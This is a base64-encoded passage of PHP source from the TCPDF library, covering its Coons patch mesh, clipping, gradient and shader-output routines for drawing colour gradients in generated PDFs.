b3V0IGNvbXBsZXRlbHkgLSBqdXN0IHRyeSBhbmQgZXJyb3IgOy0pIHBvaW50czogMTIgcGFpcnMgb2YgY29vcmRpbmF0ZXMgb2YgdGhlIEJlemllciBjb250cm9sIHBvaW50cyBhcyBhYm92ZSBmb3IgdGhlIGZpcnN0IHBhdGNoLCA4IHBhaXJzIG9mIGNvb3JkaW5hdGVzIGZvciB0aGUgZm9sbG93aW5nIHBhdGNoZXMsIGlnbm9yaW5nIHRoZSBjb29yZGluYXRlcyBhbHJlYWR5IGRlZmluZWQgYnkgdGhlIHByZWNlZGVudCBwYXRjaCAoSSBhbHNvIGRpZG4ndCBmaWd1cmUgb3V0IHRoZSBvcmRlciBvZiB0aGVzZSAtIGFsc286IHRyeSBhbmQgc2VlIHdoYXQncyBoYXBwZW5pbmcpIGNvbG9yczogbXVzdCBiZSA0IGNvbG9ycyBmb3IgdGhlIGZpcnN0IHBhdGNoLCAyIGNvbG9ycyBmb3IgdGhlIGZvbGxvd2luZyBwYXRjaGVzPC9saT48L3VsPgoJICogQHBhcmFtIGFycmF5ICRjb29yZHNfbWluIG1pbmltdW0gdmFsdWUgdXNlZCBieSB0aGUgY29vcmRpbmF0ZXMuIElmIGEgY29vcmRpbmF0ZSdzIHZhbHVlIGlzIHNtYWxsZXIgdGhhbiB0aGlzIGl0IHdpbGwgYmUgY3V0IHRvIGNvb3Jkc19taW4uIGRlZmF1bHQ6IDAKCSAqIEBwYXJhbSBhcnJheSAkY29vcmRzX21heCBtYXhpbXVtIHZhbHVlIHVzZWQgYnkgdGhlIGNvb3JkaW5hdGVzLiBJZiBhIGNvb3JkaW5hdGUncyB2YWx1ZSBpcyBncmVhdGVyIHRoYW4gdGhpcyBpdCB3aWxsIGJlIGN1dCB0byBjb29yZHNfbWF4LiBkZWZhdWx0OiAxCgkgKiBAcGFyYW0gYm9vbGVhbiAkYW50aWFsaWFzIEEgZmxhZyBpbmRpY2F0aW5nIHdoZXRoZXIgdG8gZmlsdGVyIHRoZSBzaGFkaW5nIGZ1bmN0aW9uIHRvIHByZXZlbnQgYWxpYXNpbmcgYXJ0aWZhY3RzLgoJICogQGF1dGhvciBBbmRyZWFzIFdcRkNybXNlciwgTmljb2xhIEFzdW5pCgkgKiBAc2luY2UgMy4xLjAwMCAoMjAwOC0wNi0wOSkKCSAqIEBwdWJsaWMKCSAqLwoJcHVibGljIGZ1bmN0aW9uIENvb25zUGF0Y2hNZXNoKCR4LCAkeSwgJHcsICRoLCAkY29sMT1hcnJheSgpLCAkY29sMj1hcnJheSgpLCAkY29sMz1hcnJheSgpLCAkY29sND1hcnJheSgpLCAkY29vcmRzPWFycmF5KDAuMDAsMC4wLDAuMzMsMC4wMCwwLjY3LDAuMDAsMS4wMCwwLjAwLDEuMDAsMC4zMywxLjAwLDAuNjcsMS4wMCwxLjAwLDAuNjcsMS4wMCwwLjMzLDEuMDAsMC4wMCwxLjAwLDAuMDAsMC42NywwLjAwLDAuMzMpLCAkY29vcmRzX21pbj0wLCAkY29vcmRzX21heD0xLCAkYW50aWFsaWFzPWZhbHNlKSB7CgkJaWYgKCgkdGhpcy0+cGRmYV9tb2RlICYmICR0aGlzLT5wZGZhX3ZlcnNpb24gPCAyKSBPUiAoJHRoaXMtPnN0YXRlICE9IDIpKSB7CgkJCXJldHVybjsKCQl9CgkJJHRoaXMtPkNsaXAoJHgsICR5LCAkdywgJGgpOwoJCSRuID0gY291bnQoJHRoaXMtPmdyYWRpZW50cykgKyAxOwoJCSR0aGlzLT5ncmFkaWVudHNbJG5dID0gYXJyYXkoKTsKCQkkdGhpcy0+Z3JhZGllbnRzWyRuXVsndHlwZSddID0gNjsgLy9jb29ucyBwYXRjaCBtZXNoCgkJJHRoaXMtPmdyYWRpZW50c1skbl1bJ2Nvb3JkcyddID0gYXJyYXkoKTsKCQkkdGhpcy0+Z3JhZGllbnRzWyRuXVsnYW50aWFsaWFzJ10gPSAkYW50aWFsaWFzOwoJCSR0aGlzLT5ncmFkaWVudHNbJG5dWydjb2xvcnMnXSA9IGFycmF5KCk7CgkJJHRoaXMtPmdyYWRpZW50c1skbl1bJ3RyYW5zcGFyZW5jeSddID0gZmFsc2U7CgkJLy9jaGVjayB0aGUgY29vcmRzIGFycmF5IGlmIGl0IGlzIHRoZSBzaW1wbGUgYXJyYXkgb3IgdGhlIG11bHRpIHBhdGNoIGFycmF5CgkJaWYgKCFpc3NldCgkY29vcmRzWzBdWydmJ10pKSB7CgkJCS8vc2ltcGxlIGFycmF5IC0+IGNvbnZlcnQgdG8gbXVsdGkgcGF0Y2ggYXJyYXkKCQkJaWYgKCFpc3NldCgkY29sMVsxXSkpIHsKCQkJCSRjb2wxWzFdID0gJGNvbDFbMl0gPSAkY29sMVswXTsKCQkJfQoJCQlpZiAoIWlzc2V0KCRjb2wyWzFdKSkgewoJCQkJJGNvbDJbMV0gPSAkY29sMlsyXSA9ICRjb2wyWzBdOwoJCQl9CgkJCWlmICghaXNzZXQoJGNvbDNbMV0pKSB7CgkJCQkkY29sM1sxXSA9ICRjb2wzWzJdID0gJGNvbDNbMF07CgkJCX0KCQkJaWYgKCFpc3NldCgkY29sNFsxXSkpIHsKCQkJCSRjb2w0WzFdID0gJGNvbDRbMl0gPSAkY29sNFswXTsKCQkJfQoJCQkkcGF0Y2hfYXJyYXlbMF1bJ2YnXSA9IDA7CgkJCSRwYXRjaF9hcnJheVswXVsncG9pbnRzJ10gPSAkY29vcmRzOwoJCQkkcGF0Y2hfYXJyYXlbMF1bJ2NvbG9ycyddWzBdWydyJ10gPSAkY29sMVswXTsKCQkJJHBhdGNoX2FycmF5WzBdWydjb2xvcnMnXVswXVsnZyddID0gJGNvbDFbMV07CgkJCSRwYXRjaF9hcnJheVswXVsnY29sb3JzJ11bMF1bJ2InXSA9ICRjb2wxWzJdOwoJCQkkcGF0Y2hfYXJyYXlbMF1bJ2NvbG9ycyddWzFdWydyJ10gPSAkY29sMlswXTsKCQkJJHBhdGNoX2FycmF5WzBdWydjb2xvcnMnXVsxXVsnZyddID0gJGNvbDJbMV07CgkJCSRwYXRjaF9hcnJheVswXVsnY29sb3JzJ11bMV1bJ2InXSA9ICRjb2wyWzJdOwoJCQkkcGF0Y2hfYXJyYXlbMF1bJ2NvbG9ycyddWzJdWydyJ10gPSAkY29sM1swXTsKCQkJJHBhdGNoX2FycmF5WzBdWydjb2xvcnMnXVsyXVsnZyddID0gJGNvbDNbMV07CgkJCSRwYXRjaF9hcnJheVswXVsnY29sb3JzJ11bMl1bJ2InXSA9ICRjb2wzWzJdOwoJCQkkcGF0Y2hfYXJyYXlbMF1bJ2NvbG9ycyddWzNdWydyJ10gPSAkY29sNFswXTsKCQkJJHBhdGNoX2FycmF5WzBdWydjb2xvcnMnXVszXVsnZyddID0gJGNvbDRbMV07CgkJCSRwYXRjaF9hcnJheVswXVsnY29sb3JzJ11bM11bJ2InXSA9ICRjb2w0WzJdOwoJCX0gZWxzZSB7CgkJCS8vbXVsdGkgcGF0Y2ggYXJyYXkKCQkJJHBhdGNoX2FycmF5ID0gJGNvb3JkczsKCQl9CgkJJGJwY2QgPSA2NTUzNTsgLy8xNiBiaXRzIHBlciBjb29yZGluYXRlCgkJLy9idWlsZCB0aGUgZGF0YSBzdHJlYW0KCQkkdGhpcy0+Z3JhZGllbnRzWyRuXVsnc3RyZWFtJ10gPSAnJzsKCQkkY291bnRfcGF0Y2ggPSBjb3VudCgkcGF0Y2hfYXJyYXkpOwoJCWZvciAoJGk9MDsgJGkgPCAkY291bnRfcGF0Y2g7ICsrJGkpIHsKCQkJJHRoaXMtPmdyYWRpZW50c1skbl1bJ3N0cmVhbSddIC49IGNocigkcGF0Y2hfYXJyYXlbJGldWydmJ10pOyAvL3N0YXJ0IHdpdGggdGhlIGVkZ2UgZmxhZyBhcyA4IGJpdAoJCQkkY291bnRfcG9pbnRzID0gY291bnQoJHBhdGNoX2FycmF5WyRpXVsncG9pbnRzJ10pOwoJCQlmb3IgKCRqPTA7ICRqIDwgJGNvdW50X3BvaW50czsgKyskaikgewoJCQkJLy9lYWNoIHBvaW50IGFzIDE2IGJpdAoJCQkJJHBhdGNoX2FycmF5WyRpXVsncG9pbnRzJ11bJGpdID0gKCgkcGF0Y2hfYXJyYXlbJGldWydwb2ludHMnXVskal0gLSAkY29vcmRzX21pbikgLyAoJGNvb3Jkc19tYXggLSAkY29vcmRzX21pbikpICogJGJwY2Q7CgkJCQlpZiAoJHBhdGNoX2FycmF5WyRpXVsncG9pbnRzJ11bJGpdIDwgMCkgewoJCQkJCSRwYXRjaF9hcnJheVskaV1bJ3BvaW50cyddWyRqXSA9IDA7CgkJCQl9CgkJCQlpZiAoJHBhdGNoX2FycmF5WyRpXVsncG9pbnRzJ11bJGpdID4gJGJwY2QpIHsKCQkJCQkkcGF0Y2hfYXJyYXlbJGldWydwb2ludHMnXVskal0gPSAkYnBjZDsKCQkJCX0KCQkJCSR0aGlzLT5ncmFkaWVudHNbJG5dWydzdHJlYW0nXSAuPSBjaHIoKGludCkgZmxvb3IoJHBhdGNoX2FycmF5WyRpXVsncG9pbnRzJ11bJGpdIC8gMjU2KSk7CgkJCQkkdGhpcy0+Z3JhZGllbnRzWyRuXVsnc3RyZWFtJ10gLj0gY2hyKChpbnQpIGZsb29yKGludHZhbCgkcGF0Y2hfYXJyYXlbJGldWydwb2ludHMnXVskal0pICUgMjU2KSk7CgkJCX0KCQkJJGNvdW50X2NvbHMgPSBjb3VudCgkcGF0Y2hfYXJyYXlbJGldWydjb2xvcnMnXSk7CgkJCWZvciAoJGo9MDsgJGogPCAkY291bnRfY29sczsgKyskaikgewoJCQkJLy9lYWNoIGNvbG9yIGNvbXBvbmVudCBhcyA4IGJpdAoJCQkJJHRoaXMtPmdyYWRpZW50c1skbl1bJ3N0cmVhbSddIC49IGNocigkcGF0Y2hfYXJyYXlbJGldWydjb2xvcnMnXVskal1bJ3InXSk7CgkJCQkkdGhpcy0+Z3JhZGllbnRzWyRuXVsnc3RyZWFtJ10gLj0gY2hyKCRwYXRjaF9hcnJheVskaV1bJ2NvbG9ycyddWyRqXVsnZyddKTsKCQkJCSR0aGlzLT5ncmFkaWVudHNbJG5dWydzdHJlYW0nXSAuPSBjaHIoJHBhdGNoX2FycmF5WyRpXVsnY29sb3JzJ11bJGpdWydiJ10pOwoJCQl9CgkJfQoJCS8vcGFpbnQgdGhlIGdyYWRpZW50CgkJJHRoaXMtPl9vdXQoJy9TaCcuJG4uJyBzaCcpOwoJCS8vcmVzdG9yZSBwcmV2aW91cyBHcmFwaGljIFN0YXRlCgkJJHRoaXMtPl9vdXRSZXN0b3JlR3JhcGhpY3NTdGF0ZSgpOwoJCWlmICgkdGhpcy0+aW54b2JqKSB7CgkJCS8vIHdlIGFyZSBpbnNpZGUgYW4gWE9iamVjdCB0ZW1wbGF0ZQoJCQkkdGhpcy0+eG9iamVjdHNbJHRoaXMtPnhvYmppZF1bJ2dyYWRpZW50cyddWyRuXSA9ICR0aGlzLT5ncmFkaWVudHNbJG5dOwoJCX0KCX0KCgkvKioKCSAqIFNldCBhIHJlY3Rhbmd1bGFyIGNsaXBwaW5nIGFyZWEuCgkgKiBAcGFyYW0gZmxvYXQgJHggYWJzY2lzc2Egb2YgdGhlIHRvcCBsZWZ0IGNvcm5lciBvZiB0aGUgcmVjdGFuZ2xlIChvciB0b3AgcmlnaHQgY29ybmVyIGZvciBSVEwgbW9kZSkuCgkgKiBAcGFyYW0gZmxvYXQgJHkgb3JkaW5hdGUgb2YgdGhlIHRvcCBsZWZ0IGNvcm5lciBvZiB0aGUgcmVjdGFuZ2xlLgoJICogQHBhcmFtIGZsb2F0ICR3IHdpZHRoIG9mIHRoZSByZWN0YW5nbGUuCgkgKiBAcGFyYW0gZmxvYXQgJGggaGVpZ2h0IG9mIHRoZSByZWN0YW5nbGUuCgkgKiBAYXV0aG9yIEFuZHJlYXMgV1xGQ3Jtc2VyLCBOaWNvbGEgQXN1bmkKCSAqIEBzaW5jZSAzLjEuMDAwICgyMDA4LTA2LTA5KQoJICogQHByb3RlY3RlZAoJICovCglwcm90ZWN0ZWQgZnVuY3Rpb24gQ2xpcCgkeCwgJHksICR3LCAkaCkgewoJCWlmICgkdGhpcy0+c3RhdGUgIT0gMikgewoJCQkgcmV0dXJuOwoJCX0KCQlpZiAoJHRoaXMtPnJ0bCkgewoJCQkkeCA9ICR0aGlzLT53IC0gJHggLSAkdzsKCQl9CgkJLy9zYXZlIGN1cnJlbnQgR3JhcGhpYyBTdGF0ZQoJCSRzID0gJ3EnOwoJCS8vc2V0IGNsaXBwaW5nIGFyZWEKCQkkcyAuPSBzcHJpbnRmKCcgJUYgJUYgJUYgJUYgcmUgVyBuJywgJHgqJHRoaXMtPmssICgkdGhpcy0+aC0keSkqJHRoaXMtPmssICR3KiR0aGlzLT5rLCAtJGgqJHRoaXMtPmspOwoJCS8vc2V0IHVwIHRyYW5zZm9ybWF0aW9uIG1hdHJpeCBmb3IgZ3JhZGllbnQKCQkkcyAuPSBzcHJpbnRmKCcgJUYgMCAwICVGICVGICVGIGNtJywgJHcqJHRoaXMtPmssICRoKiR0aGlzLT5rLCAkeCokdGhpcy0+aywgKCR0aGlzLT5oLSgkeSskaCkpKiR0aGlzLT5rKTsKCQkkdGhpcy0+X291dCgkcyk7Cgl9CgoJLyoqCgkgKiBPdXRwdXQgZ3JhZGllbnQuCgkgKiBAcGFyYW0gaW50ICR0eXBlIHR5cGUgb2YgZ3JhZGllbnQgKDEgRnVuY3Rpb24tYmFzZWQgc2hhZGluZzsgMiBBeGlhbCBzaGFkaW5nOyAzIFJhZGlhbCBzaGFkaW5nOyA0IEZyZWUtZm9ybSBHb3VyYXVkLXNoYWRlZCB0cmlhbmdsZSBtZXNoOyA1IExhdHRpY2UtZm9ybSBHb3VyYXVkLXNoYWRlZCB0cmlhbmdsZSBtZXNoOyA2IENvb25zIHBhdGNoIG1lc2g7IDcgVGVuc29yLXByb2R1Y3QgcGF0Y2ggbWVzaCkuIChOb3QgYWxsIHR5cGVzIGFyZSBjdXJyZW50bHkgc3VwcG9ydGVkKQoJICogQHBhcmFtIGFycmF5ICRjb29yZHMgYXJyYXkgb2YgY29vcmRpbmF0ZXMuCgkgKiBAcGFyYW0gYXJyYXkgJHN0b3BzIGFycmF5IGdyYWRpZW50IGNvbG9yIGNvbXBvbmVudHM6IGNvbG9yID0gYXJyYXkgb2YgR1JBWSwgUkdCIG9yIENNWUsgY29sb3IgY29tcG9uZW50czsgb2Zmc2V0ID0gKDAgdG8gMSkgcmVwcmVzZW50cyBhIGxvY2F0aW9uIGFsb25nIHRoZSBncmFkaWVudCB2ZWN0b3I7IGV4cG9uZW50ID0gZXhwb25lbnQgb2YgdGhlIGV4cG9uZW50aWFsIGludGVycG9sYXRpb24gZnVuY3Rpb24gKGRlZmF1bHQgPSAxKS4KCSAqIEBwYXJhbSBhcnJheSAkYmFja2dyb3VuZCBBbiBhcnJheSBvZiBjb2xvdXIgY29tcG9uZW50cyBhcHByb3ByaWF0ZSB0byB0aGUgY29sb3VyIHNwYWNlLCBzcGVjaWZ5aW5nIGEgc2luZ2xlIGJhY2tncm91bmQgY29sb3VyIHZhbHVlLgoJICogQHBhcmFtIGJvb2xlYW4gJGFudGlhbGlhcyBBIGZsYWcgaW5kaWNhdGluZyB3aGV0aGVyIHRvIGZpbHRlciB0aGUgc2hhZGluZyBmdW5jdGlvbiB0byBwcmV2ZW50IGFsaWFzaW5nIGFydGlmYWN0cy4KCSAqIEBhdXRob3IgTmljb2xhIEFzdW5pCgkgKiBAc2luY2UgMy4xLjAwMCAoMjAwOC0wNi0wOSkKCSAqIEBwdWJsaWMKCSAqLwoJcHVibGljIGZ1bmN0aW9uIEdyYWRpZW50KCR0eXBlLCAkY29vcmRzLCAkc3RvcHMsICRiYWNrZ3JvdW5kPWFycmF5KCksICRhbnRpYWxpYXM9ZmFsc2UpIHsKCQlpZiAoKCR0aGlzLT5wZGZhX21vZGUgJiYgJHRoaXMtPnBkZmFfdmVyc2lvbiA8IDIpIE9SICgkdGhpcy0+c3RhdGUgIT0gMikpIHsKCQkJcmV0dXJuOwoJCX0KCQkkbiA9IGNvdW50KCR0aGlzLT5ncmFkaWVudHMpICsgMTsKCQkkdGhpcy0+Z3JhZGllbnRzWyRuXSA9IGFycmF5KCk7CgkJJHRoaXMtPmdyYWRpZW50c1skbl1bJ3R5cGUnXSA9ICR0eXBlOwoJCSR0aGlzLT5ncmFkaWVudHNbJG5dWydjb29yZHMnXSA9ICRjb29yZHM7CgkJJHRoaXMtPmdyYWRpZW50c1skbl1bJ2FudGlhbGlhcyddID0gJGFudGlhbGlhczsKCQkkdGhpcy0+Z3JhZGllbnRzWyRuXVsnY29sb3JzJ10gPSBhcnJheSgpOwoJCSR0aGlzLT5ncmFkaWVudHNbJG5dWyd0cmFuc3BhcmVuY3knXSA9IGZhbHNlOwoJCS8vIGNvbG9yIHNwYWNlCgkJJG51bWNvbHNwYWNlID0gY291bnQoJHN0b3BzWzBdWydjb2xvciddKTsKCQkkYmNvbG9yID0gYXJyYXlfdmFsdWVzKCRiYWNrZ3JvdW5kKTsKCQlzd2l0Y2goJG51bWNvbHNwYWNlKSB7CgkJCWNhc2UgNTogICAvLyBTUE9UCgkJCWNhc2UgNDogeyAvLyBDTVlLCgkJCQkkdGhpcy0+Z3JhZGllbnRzWyRuXVsnY29sc3BhY2UnXSA9ICdEZXZpY2VDTVlLJzsKCQkJCWlmICghZW1wdHkoJGJhY2tncm91bmQpKSB7CgkJCQkJJHRoaXMtPmdyYWRpZW50c1skbl1bJ2JhY2tncm91bmQnXSA9IHNwcmludGYoJyVGICVGICVGICVGJywgJGJjb2xvclswXS8xMDAsICRiY29sb3JbMV0vMTAwLCAkYmNvbG9yWzJdLzEwMCwgJGJjb2xvclszXS8xMDApOwoJCQkJfQoJCQkJYnJlYWs7CgkJCX0KCQkJY2FzZSAzOiB7IC8vIFJHQgoJCQkJJHRoaXMtPmdyYWRpZW50c1skbl1bJ2NvbHNwYWNlJ10gPSAnRGV2aWNlUkdCJzsKCQkJCWlmICghZW1wdHkoJGJhY2tncm91bmQpKSB7CgkJCQkJJHRoaXMtPmdyYWRpZW50c1skbl1bJ2JhY2tncm91bmQnXSA9IHNwcmludGYoJyVGICVGICVGJywgJGJjb2xvclswXS8yNTUsICRiY29sb3JbMV0vMjU1LCAkYmNvbG9yWzJdLzI1NSk7CgkJCQl9CgkJCQlicmVhazsKCQkJfQoJCQljYXNlIDE6IHsgLy8gR1JBWSBTQ0FMRQoJCQkJJHRoaXMtPmdyYWRpZW50c1skbl1bJ2NvbHNwYWNlJ10gPSAnRGV2aWNlR3JheSc7CgkJCQlpZiAoIWVtcHR5KCRiYWNrZ3JvdW5kKSkgewoJCQkJCSR0aGlzLT5ncmFkaWVudHNbJG5dWydiYWNrZ3JvdW5kJ10gPSBzcHJpbnRmKCclRicsICRiY29sb3JbMF0vMjU1KTsKCQkJCX0KCQkJCWJyZWFrOwoJCQl9CgkJfQoJCSRudW1fc3RvcHMgPSBjb3VudCgkc3RvcHMpOwoJCSRsYXN0X3N0b3BfaWQgPSAkbnVtX3N0b3BzIC0gMTsKCQlmb3JlYWNoICgkc3RvcHMgYXMgJGtleSA9PiAkc3RvcCkgewoJCQkkdGhpcy0+Z3JhZGllbnRzWyRuXVsnY29sb3JzJ11bJGtleV0gPSBhcnJheSgpOwoJCQkvLyBvZmZzZXQgcmVwcmVzZW50cyBhIGxvY2F0aW9uIGFsb25nIHRoZSBncmFkaWVudCB2ZWN0b3IKCQkJaWYgKGlzc2V0KCRzdG9wWydvZmZzZXQnXSkpIHsKCQkJCSR0aGlzLT5ncmFkaWVudHNbJG5dWydjb2xvcnMnXVska2V5XVsnb2Zmc2V0J10gPSAkc3RvcFsnb2Zmc2V0J107CgkJCX0gZWxzZSB7CgkJCQlpZiAoJGtleSA9PSAwKSB7CgkJCQkJJHRoaXMtPmdyYWRpZW50c1skbl1bJ2NvbG9ycyddWyRrZXldWydvZmZzZXQnXSA9IDA7CgkJCQl9IGVsc2VpZiAoJGtleSA9PSAkbGFzdF9zdG9wX2lkKSB7CgkJCQkJJHRoaXMtPmdyYWRpZW50c1skbl1bJ2NvbG9ycyddWyRrZXldWydvZmZzZXQnXSA9IDE7CgkJCQl9IGVsc2UgewoJCQkJCSRvZmZzZXRzdGVwID0gKDEgLSAkdGhpcy0+Z3JhZGllbnRzWyRuXVsnY29sb3JzJ11bKCRrZXkgLSAxKV1bJ29mZnNldCddKSAvICgkbnVtX3N0b3BzIC0gJGtleSk7CgkJCQkJJHRoaXMtPmdyYWRpZW50c1skbl1bJ2NvbG9ycyddWyRrZXldWydvZmZzZXQnXSA9ICR0aGlzLT5ncmFkaWVudHNbJG5dWydjb2xvcnMnXVsoJGtleSAtIDEpXVsnb2Zmc2V0J10gKyAkb2Zmc2V0c3RlcDsKCQkJCX0KCQkJfQoJCQlpZiAoaXNzZXQoJHN0b3BbJ29wYWNpdHknXSkpIHsKCQkJCSR0aGlzLT5ncmFkaWVudHNbJG5dWydjb2xvcnMnXVska2V5XVsnb3BhY2l0eSddID0gJHN0b3BbJ29wYWNpdHknXTsKCQkJCWlmICgoISgkdGhpcy0+cGRmYV9tb2RlICYmICR0aGlzLT5wZGZhX3ZlcnNpb24gPCAyKSkgQU5EICgkc3RvcFsnb3BhY2l0eSddIDwgMSkpIHsKCQkJCQkkdGhpcy0+Z3JhZGllbnRzWyRuXVsndHJhbnNwYXJlbmN5J10gPSB0cnVlOwoJCQkJfQoJCQl9IGVsc2UgewoJCQkJJHRoaXMtPmdyYWRpZW50c1skbl1bJ2NvbG9ycyddWyRrZXldWydvcGFjaXR5J10gPSAxOwoJCQl9CgkJCS8vIGV4cG9uZW50IGZvciB0aGUgZXhwb25lbnRpYWwgaW50ZXJwb2xhdGlvbiBmdW5jdGlvbgoJCQlpZiAoaXNzZXQoJHN0b3BbJ2V4cG9uZW50J10pKSB7CgkJCQkkdGhpcy0+Z3JhZGllbnRzWyRuXVsnY29sb3JzJ11bJGtleV1bJ2V4cG9uZW50J10gPSAkc3RvcFsnZXhwb25lbnQnXTsKCQkJfSBlbHNlIHsKCQkJCSR0aGlzLT5ncmFkaWVudHNbJG5dWydjb2xvcnMnXVska2V5XVsnZXhwb25lbnQnXSA9IDE7CgkJCX0KCQkJLy8gc2V0IGNvbG9ycwoJCQkkY29sb3IgPSBhcnJheV92YWx1ZXMoJHN0b3BbJ2NvbG9yJ10pOwoJCQlzd2l0Y2goJG51bWNvbHNwYWNlKSB7CgkJCQljYXNlIDU6ICAgLy8gU1BPVAoJCQkJY2FzZSA0OiB7IC8vIENNWUsKCQkJCQkkdGhpcy0+Z3JhZGllbnRzWyRuXVsnY29sb3JzJ11bJGtleV1bJ2NvbG9yJ10gPSBzcHJpbnRmKCclRiAlRiAlRiAlRicsICRjb2xvclswXS8xMDAsICRjb2xvclsxXS8xMDAsICRjb2xvclsyXS8xMDAsICRjb2xvclszXS8xMDApOwoJCQkJCWJyZWFrOwoJCQkJfQoJCQkJY2FzZSAzOiB7IC8vIFJHQgoJCQkJCSR0aGlzLT5ncmFkaWVudHNbJG5dWydjb2xvcnMnXVska2V5XVsnY29sb3InXSA9IHNwcmludGYoJyVGICVGICVGJywgJGNvbG9yWzBdLzI1NSwgJGNvbG9yWzFdLzI1NSwgJGNvbG9yWzJdLzI1NSk7CgkJCQkJYnJlYWs7CgkJCQl9CgkJCQljYXNlIDE6IHsgLy8gR1JBWSBTQ0FMRQoJCQkJCSR0aGlzLT5ncmFkaWVudHNbJG5dWydjb2xvcnMnXVska2V5XVsnY29sb3InXSA9IHNwcmludGYoJyVGJywgJGNvbG9yWzBdLzI1NSk7CgkJCQkJYnJlYWs7CgkJCQl9CgkJCX0KCQl9CgkJaWYgKCR0aGlzLT5ncmFkaWVudHNbJG5dWyd0cmFuc3BhcmVuY3knXSkgewoJCQkvLyBwYWludCBsdW1pbm9zaXR5IGdyYWRpZW50CgkJCSR0aGlzLT5fb3V0KCcvVEdTJy4kbi4nIGdzJyk7CgkJfQoJCS8vcGFpbnQgdGhlIGdyYWRpZW50CgkJJHRoaXMtPl9vdXQoJy9TaCcuJG4uJyBzaCcpOwoJCS8vcmVzdG9yZSBwcmV2aW91cyBHcmFwaGljIFN0YXRlCgkJJHRoaXMtPl9vdXRSZXN0b3JlR3JhcGhpY3NTdGF0ZSgpOwoJCWlmICgkdGhpcy0+aW54b2JqKSB7CgkJCS8vIHdlIGFyZSBpbnNpZGUgYW4gWE9iamVjdCB0ZW1wbGF0ZQoJCQkkdGhpcy0+eG9iamVjdHNbJHRoaXMtPnhvYmppZF1bJ2dyYWRpZW50cyddWyRuXSA9ICR0aGlzLT5ncmFkaWVudHNbJG5dOwoJCX0KCX0KCgkvKioKCSAqIE91dHB1dCBncmFkaWVudCBzaGFkZXJzLgoJICogQGF1dGhvciBOaWNvbGEgQXN1bmkKCSAqIEBzaW5jZSAzLjEuMDAwICgyMDA4LTA2LTA5KQoJICogQHByb3RlY3RlZAoJICovCglmdW5jdGlvbiBfcHV0c2hhZGVycygpIHsKCQlpZiAoJHRoaXMtPnBkZmFfbW9kZSAmJiAkdGhpcy0+cGRmYV92ZXJzaW9uIDwgMikgewoJCQlyZXR1cm47CgkJfQoJCSRpZHQgPSBjb3VudCgkdGhpcy0+Z3JhZGllbnRzKTsgLy9pbmRleCBmb3IgdHJhbnNwYXJlbmN5IGdyYWRpZW50cwoJCWZvcmVhY2ggKCR0aGlzLT5ncmFkaWVudHMgYXMgJGlkID0+ICRncmFkKSB7CgkJCWlmICgoJGdyYWRbJ3R5cGUnXSA9PSAyKSBPUiAoJGdyYWRbJ3R5cGUnXSA9PSAzKSkgewoJCQkJJGZjID0gJHRoaXMtPl9uZXdvYmooKTsKCQkJCSRvdXQgPSAnPDwnOwoJCQkJJG91dCAuPSAnIC9GdW5jdGlvblR5cGUgMyc7CgkJCQkkb3V0IC49ICcgL0RvbWFpbiBbMCAxXSc7CgkJCQkkZnVuY3Rpb25zID0gJyc7CgkJCQkkYm91bmRzID0gJyc7CgkJCQkkZW5jb2RlID0gJyc7CgkJCQkkaSA9IDE7CgkJCQkkbnVtX2NvbHMgPSBjb3VudCgkZ3JhZFsnY29sb3JzJ10pOwoJCQkJJGxhc3Rjb2xzID0gJG51bV9jb2xzIC0gMTsKCQkJCWZvciAoJGkgPSAxOyAkaSA8ICRudW1fY29sczsgKyskaSkgewoJCQkJCSRmdW5jdGlvbnMgLj0gKCRmYyArICRpKS4nIDAgUiAnOwoJCQkJCWlmICgkaSA8ICRsYXN0Y29scykgewoJCQkJCQkkYm91bmRzIC49IHNwcmludGYoJyVGICcsICRncmFkWydjb2xvcnMnXVskaV1bJ29mZnNldCddKTsKCQkJCQl9CgkJCQkJJGVuY29kZSAuPSAnMCAxICc7CgkJCQl9CgkJCQkkb3V0IC49ICcgL0Z1bmN0aW9ucyBbJy50cmltKCRmdW5jdGlvbnMpLiddJzsKCQkJCSRvdXQgLj0gJyAvQm91bmRzIFsnLnRyaW0oJGJvdW5kcykuJ10nOwoJCQkJJG91dCAuPSAnIC9FbmNvZGUgWycudHJpbSgkZW5jb2RlKS4nXSc7CgkJCQkkb3V0IC49ICcgPj4nOwoJCQkJJG91dCAuPSAiXG4iLidlbmRvYmonOwoJCQkJJHRoaXMtPl9vdXQoJG91dCk7CgkJCQlmb3IgKCRpID0gMTsgJGkgPCAkbnVtX2NvbHM7ICsrJGkpIHsKCQkJCQkkdGhpcy0+X25ld29iaigpOwoJCQkJCSRvdXQgPSAnPDwnOwoJCQkJCSRvdXQgLj0gJyAvRnVuY3Rpb25UeXBlIDInOwoJCQkJCSRvdXQgLj0gJyAvRG9tYWluIFswIDFdJzsKCQkJCQkkb3V0IC49ICcgL0MwIFsnLiRncmFkWydjb2xvcnMnXVsoJGkgLSAxKV1bJ2NvbG9yJ10uJ10nOwoJCQkJCSRvdXQgLj0gJyAvQzEgWycuJGdyYWRbJ2NvbG9ycyddWyRpXVsnY29sb3InXS4nXSc7CgkJCQkJJG91dCAuPSAnIC9OICcuJGdyYWRbJ2NvbG9ycyddWyRpXVsnZXhwb25lbnQnXTsKCQkJCQkkb3V0IC49ICcgPj4nOwoJCQkJCSRvdXQgLj0gIlxuIi4nZW5kb2JqJzsKCQkJCQkkdGhpcy0+X291dCgkb3V0KTsKCQkJCX0KCQkJCS8vIHNldCB0cmFuc3BhcmVuY3kgZnVuY3Rpb25zCgkJCQlpZiAoJGdyYWRbJ3RyYW5zcGFyZW5jeSddKSB7CgkJCQkJJGZ0ID0gJHRoaXMtPl9uZXdvYmooKTsKCQkJCQkkb3V0ID0gJzw8JzsKCQkJCQkkb3V0IC49ICcgL0Z1bmN0aW9uVHlwZSAzJzsKCQkJCQkkb3V0IC49ICcgL0RvbWFpbiBbMCAxXSc7CgkJCQkJJGZ1bmN0aW9ucyA9ICcnOwoJCQkJCSRpID0gMTsKCQkJCQkkbnVtX2NvbHMgPSBjb3VudCgkZ3JhZFsnY29sb3JzJ10pOwoJCQkJCWZvciAoJGkgPSAxOyAkaSA8ICRudW1fY29sczsgKyskaSkgewoJCQkJCQkkZnVuY3Rpb25zIC49ICgkZnQgKyAkaSkuJyAwIFIgJzsKCQkJCQl9CgkJCQkJJG91dCAuPSAnIC9GdW5jdGlvbnMgWycudHJpbSgkZnVuY3Rpb25zKS4nXSc7CgkJCQkJJG91dCAuPSAnIC9Cb3VuZHMgWycudHJpbSgkYm91bmRzKS4nXSc7CgkJCQkJJG91dCAuPSAnIC9FbmNvZGUgWycudHJpbSgkZW5jb2RlKS4nXSc7CgkJCQkJJG91dCAuPSAnI